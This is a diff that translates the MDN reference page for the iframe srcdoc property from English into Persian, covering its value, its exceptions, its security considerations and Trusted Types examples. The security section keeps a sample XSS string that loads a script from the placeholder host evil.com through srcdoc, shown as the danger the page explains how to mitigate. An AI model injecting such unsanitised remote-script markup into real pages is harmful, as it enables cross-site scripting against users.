@@ -1,11 +1,5 @@
 ---
 title: "HTMLIFrameElement: srcdoc property"
-source: "https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/srcdoc"
-status: "needs-translation"
----
-
----
-title: "HTMLIFrameElement: srcdoc property"
 short-title: srcdoc
 slug: Web/API/HTMLIFrameElement/srcdoc
 page-type: web-api-instance-property
@@ -15,48 +9,42 @@ browser-compat: api.HTMLIFrameElement.srcdoc
 {{APIRef("HTML DOM")}}
 
 > [!WARNING]
-> This property parses its input as HTML, writing the result into the frame's DOM.
-> APIs like this are known as [injection sinks](/en-US/docs/Web/API/Trusted_Types_API#concepts_and_usage), and are potentially a vector for [cross-site scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS) attacks, if the input originally came from an attacker.
+> این ویژگی ورودی خود را به صورت HTML تجزیه می‌کند و نتیجه را در DOM فریم می‌نویسد.
+> API‌هایی از این دست به عنوان [حوضچه‌های تزریق](/en-US/docs/Web/API/Trusted_Types_API#concepts_and_usage) شناخته می‌شوند و در صورتی که ورودی از سوی یک مهاجم باشد، به طور بالقوه یک بردار برای حملات [اسکریپت‌نویسی بین‌سایتی (XSS)](/en-US/docs/Web/Security/Attacks/XSS) هستند.
 >
-> You can mitigate this risk by always assigning `TrustedHTML` objects instead of strings and [enforcing trusted types](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
-> See [Security considerations](#security_considerations) for more information.
+> می‌توانید این خطر را با اختصاص دادن همیشگی اشیاء `TrustedHTML` به جای رشته‌ها و [اجباری کردن انواع قابل اعتماد](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) کاهش دهید.
+> برای اطلاعات بیشتر به [ملاحظات امنیتی](#security_considerations) مراجعه کنید.
 
-The **`srcdoc`** property of the {{domxref("HTMLIFrameElement")}} interface gets or sets the inline HTML markup of the frame's document.
+خاصیت **`srcdoc`** از رابط {{domxref("HTMLIFrameElement")}}، نشانه‌گذاری HTML درون‌خطی سند فریم را دریافت یا تنظیم می‌کند.
 
-This reflects the [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) attribute of the {{htmlelement("iframe")}}.
+این ویژگی منعکس‌کنندهٔ صفت [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) عنصر {{htmlelement("iframe")}} است.
 
-## Value
+## مقدار
 
-Getting the property returns a string containing the HTML serialization of the frame's document.
-This is `undefined` if the value is not set.
+دریافت این خاصیت یک رشته شامل سریال‌سازی HTML سند فریم را برمی‌گرداند. اگر مقدار تنظیم نشده باشد، `undefined` است.
 
-Setting the property accepts either a {{domxref("TrustedHTML")}} object or a string.
-It parses this input as an HTML document and replaces the content of the frame with the result.
+تنظیم این خاصیت یک شیء {{domxref("TrustedHTML")}} یا یک رشته را می‌پذیرد. این ورودی را به عنوان یک سند HTML تجزیه کرده و محتوای فریم را با نتیجه جایگزین می‌کند.
 
-### Exceptions
+### استثناها
 
 - `TypeError`
-  - : Thrown if the property is set to a string when [Trusted Types](/en-US/docs/Web/API/Trusted_Types_API) are [enforced by a CSP](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) and no default policy is defined.
+  - : زمانی پرتاب می‌شود که خاصیت به یک رشته تنظیم شود در حالی که [Trusted Types](/en-US/docs/Web/API/Trusted_Types_API) توسط یک [CSP] enforce شده‌اند و هیچ خط مشی پیش‌فرضی تعریف نشده باشد.
 
-## Description
+## توضیحات
 
-The **`srcdoc`** property reflects the content of the `<iframe>` element's [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) attribute, and can be used to set or get the HTML document belonging to the {{htmlelement("iframe")}}.
+خاصیت **`srcdoc`** محتوای صفت [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) عنصر `<iframe>` را منعکس می‌کند و می‌توان از آن برای تنظیم یا دریافت سند HTML متعلق به {{htmlelement("iframe")}} استفاده کرد.
 
-When setting the property the input should define a valid HTML document, including the {{glossary("doctype","doctype directive")}}, {{htmlelement("html")}}, {{htmlelement("body")}}, and other tags.
-Note though, that browsers are usually tolerant of invalid markup, and most should attempt to render input that contains only body content.
+هنگام تنظیم این خاصیت، ورودی باید یک سند HTML معتبر شامل {{glossary("doctype","دستور doctype")}}، {{htmlelement("html")}}، {{htmlelement("body")}} و سایر برچسب‌ها را تعریف کند. با این حال توجه داشته باشید که مرورگرها معمولاً نسبت به نشانه‌گذاری نامعتبر تحمل دارند و اکثر آن‌ها سعی می‌کنند ورودی‌ای که فقط شامل محتوای بدنه است را رندر کنند.
 
-Any markup supported by the browser will be parsed/serialized, including {{glossary("shadow tree", "Shadow roots")}}.
+هر نشانه‌گذاری که توسط مرورگر پشتیبانی می‌شود، از جمله {{glossary("shadow tree", "ریشه‌های سایه")}}، تجزیه/سریال‌سازی خواهد شد.
 
-Note that if this is set, it will override any value set in the {{domxref("HTMLIFrameElement.src", "src")}} property.
+توجه داشته باشید که اگر این ویژگی تنظیم شود، هر مقداری که در خاصیت {{domxref("HTMLIFrameElement.src", "src")}} تنظیم شده باشد را نادیده می‌گیرد.
 
-### Security considerations
+### ملاحظات امنیتی
 
-The `srcdoc` property allows absolutely any HTML markup to run in a frame by default.
-If the frame is not sandboxed using the Content Security Property (CSP) [`sandbox` directive](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) (or is sandboxed but includes the [`allow-same-origin`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) value) then it will be same-origin with the parent.
-This means that the frame will have complete access to the parent DOM and resources, and visa versa.
+خاصیت `srcdoc` به طور پیش‌فرض اجازه می‌دهد هر نشانه‌گذاری HTML در یک فریم اجرا شود. اگر فریم با استفاده از دستور [`sandbox`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) سیاست امنیت محتوا (CSP) محصور نشده باشد (یا محصور شده باشد اما شامل مقدار [`allow-same-origin`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) باشد)، آنگاه با والد خود هم‌مبدأ خواهد بود. این بدان معناست که فریم به طور کامل به DOM و منابع والد دسترسی خواهد داشت و بالعکس.
 
-This is a significant vector for [cross-site scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS) attacks if potentially unsafe strings provided by a user are injected into a frame without first being sanitized.
-Consider the following code where a string of HTML from a user might be passed into a frame that is then added to the document.
+این یک بردار قابل توجه برای حملات [اسکریپت‌نویسی بین‌سایتی (XSS)](/en-US/docs/Web/Security/Attacks/XSS) است اگر رشته‌های بالقوه ناایمن ارائه‌شده توسط کاربر بدون پالایش قبلی به یک فریم تزریق شوند. کد زیر را در نظر بگیرید که در آن یک رشته HTML از یک کاربر ممکن است به یک فریم منتقل شود و سپس به سند اضافه شود.
 
 ```js
 const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
@@ -65,20 +53,17 @@ iframe.srcdoc = untrustedStringFromUser;
 document.body.appendChild(iframe);
 ```
 
-If the frame is not expected to need access to your parent document, you can mitigate the risk by using a CSP sandbox without the `allow-same-origin` value.
-The frame will then be treated as a cross-origin resource, and attacks will be significantly restricted.
-You can also use a more general CSP to restrict the locations from which scripts and other resources are allowed to be fetched.
+اگر انتظار نمی‌رود که فریم به سند والد شما نیاز داشته باشد، می‌توانید با استفاده از محصورسازی CSP بدون مقدار `allow-same-origin` خطر را کاهش دهید. سپس فریم به عنوان یک منبع متقاطع-مبدأ در نظر گرفته می‌شود و حملات به طور قابل توجهی محدود می‌شوند. همچنین می‌توانید از یک CSP عمومی‌تر برای محدود کردن مکان‌هایی که اسکریپت‌ها و سایر منابع مجاز به دریافت از آن‌ها هستند استفاده کنید.
 
-You can further reduce the risk by always assigning {{domxref("TrustedHTML")}} objects instead of strings, and [enforcing trusted type](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) using the [`require-trusted-types-for`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for) CSP directive.
-This ensures that the input is passed through a transformation function, which has the chance to [sanitize](/en-US/docs/Web/Security/Attacks/XSS#sanitization) the input to remove potentially dangerous markup before it is injected.
+می‌توانید با اختصاص دادن همیشگی اشیاء {{domxref("TrustedHTML")}} به جای رشته‌ها و [اجبار نوع قابل اعتماد](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) با استفاده از دستور [`require-trusted-types-for`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for) CSP، خطر را بیشتر کاهش دهید. این تضمین می‌کند که ورودی از یک تابع تبدیل عبور کند، که فرصت [پالایش](/en-US/docs/Web/Security/Attacks/XSS#sanitization) ورودی برای حذف نشانه‌گذاری بالقوه خطرناک قبل از تزریق را دارد.
 
-## Examples
+## مثال‌ها
 
-### Reading the HTML from an iframe
+### خواندن HTML از یک iframe
 
-Reading `srcdoc` causes the user agent to serialize the iframe's document.
+خواندن `srcdoc` باعث می‌شود عامل کاربر سند iframe را سریال‌سازی کند.
 
-Given the following HTML:
+با توجه به HTML زیر:
 
 ```html
 <iframe
@@ -86,7 +71,7 @@ Given the following HTML:
   srcdoc="<!doctype html><body><p>Hello World!</p></body>"></iframe>
 ```
 
-You can get and log the markup as shown:
+می‌توانید نشانه‌گذاری را به صورت زیر دریافت و ثبت کنید:
 
 ```js
 const frame = document.querySelector("#example");
@@ -94,21 +79,18 @@ const frameDoc = frame.srcdoc;
 console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
 ```
 
-### Replacing the frame inline source
+### جایگزینی منبع درون‌خطی فریم
 
-In this example we'll replace a frame's document by assigning HTML to its `srcdoc` property.
-To mitigate the risk of XSS, we'll first create a `TrustedHTML` object from the string containing the HTML, and then assign that object to `srcdoc`.
+در این مثال، سند یک فریم را با اختصاص HTML به خاصیت `srcdoc` آن جایگزین می‌کنیم. برای کاهش خطر XSS، ابتدا یک شیء `TrustedHTML` از رشته حاوی HTML ایجاد می‌کنیم و سپس آن شیء را به `srcdoc` اختصاص می‌دهیم.
 
-Trusted types are not yet supported on all browsers, so first we define the [trusted types tinyfill](/en-US/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
-This acts as a transparent replacement for the Trusted Types JavaScript API:
+انواع قابل اعتماد هنوز در همه مرورگرها پشتیبانی نمی‌شوند، بنابراین ابتدا [tinyfill انواع قابل اعتماد](/en-US/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill) را تعریف می‌کنیم. این به عنوان یک جایگزین شفاف برای API JavaScript Trusted Types عمل می‌کند:
 
 ```js
 if (typeof trustedTypes === "undefined")
   trustedTypes = { createPolicy: (n, rules) => rules };
 ```
 
-Next we create a {{domxref("TrustedTypePolicy")}} that defines a {{domxref("TrustedTypePolicy/createHTML", "createHTML()")}} for transforming an input string into {{domxref("TrustedHTML")}} instances.
-Commonly, implementations of `createHTML()` use a library such as [DOMPurify](https://github.com/cure53/DOMPurify) to sanitize the input, as shown below:
+سپس یک {{domxref("TrustedTypePolicy")}} ایجاد می‌کنیم که یک {{domxref("TrustedTypePolicy/createHTML", "createHTML()")}} را برای تبدیل یک رشته ورودی به نمونه‌های {{domxref("TrustedHTML")}} تعریف می‌کند. معمولاً پیاده‌سازی‌های `createHTML()` از کتابخانه‌ای مانند [DOMPurify](https://github.com/cure53/DOMPurify) برای پالایش ورودی استفاده می‌کنند، همانطور که در زیر نشان داده شده است:
 
 ```js
 const policy = trustedTypes.createPolicy("my-policy", {
@@ -116,7 +98,7 @@ const policy = trustedTypes.createPolicy("my-policy", {
 });
 ```
 
-Then we use this `policy` object to create a `TrustedHTML` object from the potentially unsafe input string, and assign the result to the element:
+سپس از این شیء `policy` برای ایجاد یک شیء `TrustedHTML` از رشته ورودی بالقوه ناایمن استفاده می‌کنیم و نتیجه را به عنصر اختصاص می‌دهیم:
 
 ```js
 // The potentially malicious string
@@ -132,13 +114,13 @@ const frameDoc = frame.srcdoc;
 ```
 
 > [!WARNING]
-> While you can directly assign a string to `srcdoc`, this is a [security risk](#security_considerations) if the string to be inserted might contain potentially malicious content.
-> You should use `TrustedHTML` to ensure that the content is sanitized before it is inserted, and you should set a CSP header to [enforce trusted types](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
+> اگرچه می‌توانید مستقیماً یک رشته به `srcdoc` اختصاص دهید، این یک [خطر امنیتی](#security_considerations) است اگر رشته‌ای که قرار است درج شود ممکن است حاوی محتوای بالقوه مخرب باشد.
+> باید از `TrustedHTML` استفاده کنید تا اطمینان حاصل شود که محتوا قبل از درج پالایش شده است، و همچنین باید یک هدر CSP برای [اجباری کردن انواع قابل اعتماد](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) تنظیم کنید.
 
-## Specifications
+## مشخصات
 
 {{Specifications}}
 
-## Browser compatibility
+## سازگاری با مرورگرها
 
 {{Compat}}
